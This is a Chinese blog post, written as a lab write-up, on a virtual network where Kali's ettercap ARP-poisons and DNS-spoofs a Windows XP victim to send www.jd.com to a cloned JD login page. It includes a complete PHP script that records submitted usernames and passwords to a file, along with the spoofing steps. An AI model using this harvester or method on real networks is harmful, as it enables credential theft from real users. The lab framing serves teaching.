<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    

<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>

<meta charset="utf-8" >

<title>DNS欺骗、ARP攻击及钓鱼</title>
<meta name="keywords" content="DNS欺骗、ARP攻击及钓鱼, killeveee">
<meta name="description" content="记一次利用DNS欺骗、ARP攻击及钓鱼">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="/favicon.ico">
<link rel="stylesheet" href="/style/main.css">


<link rel="stylesheet" href="/style/jquery.fancybox.min.css">




    <link rel="stylesheet" href="/style/prism.css"/>




  <meta name="generator" content="Hexo 6.1.0"></head>
  <body>
    <div id="app" class="main">

<div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://killeveee.github.io/archives">
        <img class="avatar" src="/images/avatar.png" alt="logo" width="32px" height="32px">
      </a>
      <a href="https://killeveee.github.io/archives">
        <h1 class="site-title">killeveee</h1>
      </a>
    </div>
    <div class="right">
        <i class="icon menu-switch icon-menu-outline" ></i>
    </div>
  </div>
</div>

<div class="menu-container" style="height: 0;opacity: 0;">
<nav class="menu-list">
  
    
      <a href="/archives" class="menu purple-link">
        Index
      </a>
    
  
    
      <a href="/tags" class="menu purple-link">
        Tags
      </a>
    
  
    
      <a href="/about" class="menu purple-link">
        About
      </a>
    
  
</nav>
</div>



  <div class="content-container">
    <div class="post-detail">
      
      <h2 class="post-title">DNS欺骗、ARP攻击及钓鱼</h2>
      <div class="post-info post-detail-info">
        <span><i class="icon icon-calendar-outline"></i> 2022-05-19</span>
        
          <span>
          <i class="icon icon-pricetags-outline"></i>
            
              <a href="/tags/%E5%86%85%E7%BD%91/">
              内网
                
                  ，
                
              </a>
            
              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
              网络基础
                
              </a>
            
          </span>
        
      </div>
      <div class="post-content-wrapper">
        <div class="post-content">
          <h1 id="DNS欺骗、ARP攻击及钓鱼"><a href="#DNS欺骗、ARP攻击及钓鱼" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼"></a>DNS欺骗、ARP攻击及钓鱼</h1><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>使用 kali 虚拟机模拟攻击者，采用 DNS 欺骗、 ARP 攻击的方式来对 XP 系统的用户进行攻击，从而获取该用户访问京东的账户和密码，即钓鱼攻击。</p>
<h3 id="平台环境"><a href="#平台环境" class="headerlink" title="平台环境"></a>平台环境</h3><blockquote>
<p>kali2.0 平台；</p>
<p>安装 XP 系统的虚拟机；</p>
<p>搭建了 DNS 和 IIS 服务的 windows server 2003 虚拟机；</p>
<p>全网互通，即一个局域网下；</p>
<p>构造好的钓鱼网站；</p>
</blockquote>
<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="制作钓鱼页面（以京东页面为例）"><a href="#制作钓鱼页面（以京东页面为例）" class="headerlink" title="制作钓鱼页面（以京东页面为例）"></a>制作钓鱼页面（以京东页面为例）</h4><p>在浏览器中打开京东的网站，在空白处鼠标右键，然后选择“另存页面为”<br> 然后， 在弹出的窗口中， 选好保存的位置， 对文件名重命名（尽量简写， 扩展名为 html），<br> 保存类型为（网页， 全部） ， 然后点击保存，<br> 对保存的页面进行修改， 用代码编辑器打开 jd.html， 然后加入 form 表单，提交方式为 POST， 用 input 控件记录用户名和密码， 保存并退出，把jd.html改为index.html。<br>制作重定向页面error.php 来记录获取到的用户名和密码， 并写入到1.txt 文件。<br>以上需要的资料， 本实验已经整理好。</p>
<p>error.php：</p>
<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
$ref &#x3D; $_SERVER[&#39;HTTP_REFERER&#39;]; &#x2F;&#x2F;获取前一页面的 URL 地址
$today &#x3D; date(&quot;F j, Y, g:i a&quot;);
if (isset($_POST[&#39;name&#39;]) &amp;&amp; !empty($_POST[&#39;name&#39;])) &#123;
$nam &#x3D; stripslashes($_POST[&#39;name&#39;]);
$pas &#x3D; stripslashes($_POST[&#39;pass&#39;]);
$nam &#x3D; htmlspecialchars($nam, ENT_QUOTES);   &#x2F;&#x2F; 转换双引号和单引号
$pas &#x3D; htmlspecialchars($pas, ENT_QUOTES);   
$content &#x3D; $today . &quot; -- &quot; . $ref . &quot; 用户名 &quot; . $nam . &quot; 密码 &quot; . $pas;
$filed &#x3D; @fopen(&quot;1.txt&quot;, &quot;a+&quot;);
@fwrite($filed, &quot;$content\n&quot;);
@fclose($filed);
&#125;
?&gt;
&lt;html&gt;
&lt;head&gt;
	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;
		function goBack()
		&#123;
			window.history.back()  &#x2F;&#x2F;后退+刷新
		&#125;
	&lt;&#x2F;script&gt;
&lt;&#x2F;head&gt;
&lt;body onload&#x3D;&quot;goBack()&quot;&gt;   &lt;!-- 加载之后立即执行一段 JavaScript --&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h4 id="网络互通"><a href="#网络互通" class="headerlink" title="网络互通"></a>网络互通</h4><table>
<thead>
<tr>
<th>PC</th>
<th>IP</th>
<th>MAC</th>
</tr>
</thead>
<tbody><tr>
<td>win xp（受害者）</td>
<td>10.1.1.1</td>
<td>76</td>
</tr>
<tr>
<td>kali（攻击者）</td>
<td>10.1.1.2</td>
<td>95</td>
</tr>
<tr>
<td>win 2003（服务器）</td>
<td>10.1.1.3</td>
<td>39</td>
</tr>
</tbody></table>
<h4 id="搭建服务器"><a href="#搭建服务器" class="headerlink" title="搭建服务器"></a>搭建服务器</h4><p>在win2003上搭建一个IIS的web服务器，提供”真的”京东页面</p>
<p>在win2003上搭建一个DNS服务器，提供域名解析服务</p>
<p><img src="/images/dy1.png" alt="dy1"></p>
<p>然后检验一下是否搭建成功，在xp中访问<code>www.jd.com</code></p>
<p><img src="/images/dy2.png" alt="dy2"></p>
<p>若没成功，检查一下xp的DNS服务器是否填的是<code>10.1.1.3</code></p>
<h4 id="搭建攻击环境"><a href="#搭建攻击环境" class="headerlink" title="搭建攻击环境"></a>搭建攻击环境</h4><p>然后再kali上搭建一个”假的”京东页面，记得要给apache权限</p>
<blockquote>
<p>chmod 777 *</p>
</blockquote>
<p>尝试用xp提交表单</p>
<p><img src="/images/dy3.png" alt="dy3"></p>
<p>访问的是10.1.1.2，就是攻击机的假的京东网站，然后我们随便输入一个密码(我自己都不知道输的啥)</p>
<p><img src="/images/dy4.png" alt="dy4"></p>
<p>提交之后在kail的1.txt文本里面就有了表单记录，说明搭建成功</p>
<h4 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h4><h5 id="配置ettercap"><a href="#配置ettercap" class="headerlink" title="配置ettercap"></a>配置ettercap</h5><p>修改 DNS 欺骗配置文件， 使用 vim 编辑器， 命令</p>
<blockquote>
<p>vim &#x2F;etc&#x2F;ettercap&#x2F;etter.dns</p>
</blockquote>
<p><img src="/images/dy5.png" alt="dy5"></p>
<h5 id="启动ettercap"><a href="#启动ettercap" class="headerlink" title="启动ettercap"></a>启动ettercap</h5><p>嗅探主机：</p>
<p><img src="/images/dy6.png" alt="dy6"></p>
<h5 id="arp投毒"><a href="#arp投毒" class="headerlink" title="arp投毒"></a>arp投毒</h5><p><img src="/images/dy7.png" alt="dy7"></p>
<p>此时查看winxp和win2003的arp记录，都是kali的MAC，说明ARP欺骗成功</p>
<h5 id="DNS投毒"><a href="#DNS投毒" class="headerlink" title="DNS投毒"></a>DNS投毒</h5><p><img src="/images/dy8.png" alt="dy8"></p>
<h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>在xp上验证一下</p>
<p>先清理一下dns缓存</p>
<blockquote>
<p>ipconfig &#x2F;flushdns</p>
</blockquote>
<p>查看dns解析</p>
<blockquote>
<p>nslookup <a target="_blank" rel="noopener" href="http://www.jd.com/">www.jd.com</a></p>
</blockquote>
<p><img src="/images/dy9.png" alt="dy9"></p>
<p>发现<code>www.jd.com</code>指向的是kali的ip地址，说明DNS欺骗成功</p>
<p>再使用浏览器访问<code>www.jd.com</code></p>
<p><img src="/images/dy10.png" alt="dy10"></p>
<p>提交表单，在kali里查看</p>
<p><img src="/images/dy11.png" alt="dy11"></p>
<p>成功拿到账号密码。</p>
<p>实验完成。</p>

        </div>
        <div class="top-div">
          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#DNS%E6%AC%BA%E9%AA%97%E3%80%81ARP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%92%93%E9%B1%BC"><span class="top-box-text">DNS欺骗、ARP攻击及钓鱼</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="top-box-text">实验目的</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%B9%B3%E5%8F%B0%E7%8E%AF%E5%A2%83"><span class="top-box-text">平台环境</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="top-box-text">实验步骤</span></a></li></ol></li></ol></li></ol>
        </div>
      </div>
    </div>

    
      <div class="next-post">
        <a class="purple-link" href="/2022/05/18/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
          <h3 class="post-title">
            下一篇：PHP7.0文件包含崩溃卡临时文件
          </h3>
        </a>
      </div>
    
  </div>




<footer>
<div class="site-footer">
  <div class="social-container">
    
      
        <a href="https://github.com/" target="_blank">
          <i class="icon icon-github"></i>
        </a>
      
    
      
        <a href="https://twitter.com/" target="_blank">
          <i class="icon icon-twitter"></i>
        </a>
      
    
      
    
      
    
      
    
  </div>
  
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
  
  
  
  
  
  
</div>
</footer>


      </div>
      
    <script src="/js/jquery.min.js"></script>
    <script src="/js/jquery.fancybox.min.js"></script>


<script id="hexo-configurations">
    window.theme_config = {"image":{"lazyload_enable":false}};
    window.is_post = true;
  </script>

<script src="/js/main.js"></script>





    </div>
  </body>
</html>

